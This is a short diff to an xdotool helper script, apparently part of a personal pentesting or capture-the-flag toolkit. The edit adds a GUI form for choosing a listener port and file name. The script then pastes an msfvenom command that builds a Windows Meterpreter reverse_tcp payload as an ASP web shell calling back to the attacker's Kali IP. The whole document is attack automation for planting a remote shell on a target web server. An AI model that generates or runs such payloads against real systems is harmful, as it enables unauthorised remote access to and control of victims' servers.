@@ -6,6 +6,13 @@ Create ASP file
 
 source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
 source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
+source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
 
-paste_command "msfvenom -p windows/meterpreter/reverse_tcp LHOST=${KALI_IP} LPORT=7000 -f asp -o shell.asp"
+# Generate gui form
+generate_form "LPORT" "filename"
+
+LPORT=${form_data["LPORT"]}
+FILE=${form_data["filename"]}
+
+paste_command "msfvenom -p windows/meterpreter/reverse_tcp LHOST=${KALI_IP} LPORT=${LPORT} -f asp -o ${FILE}.asp"
 xdotool key Return
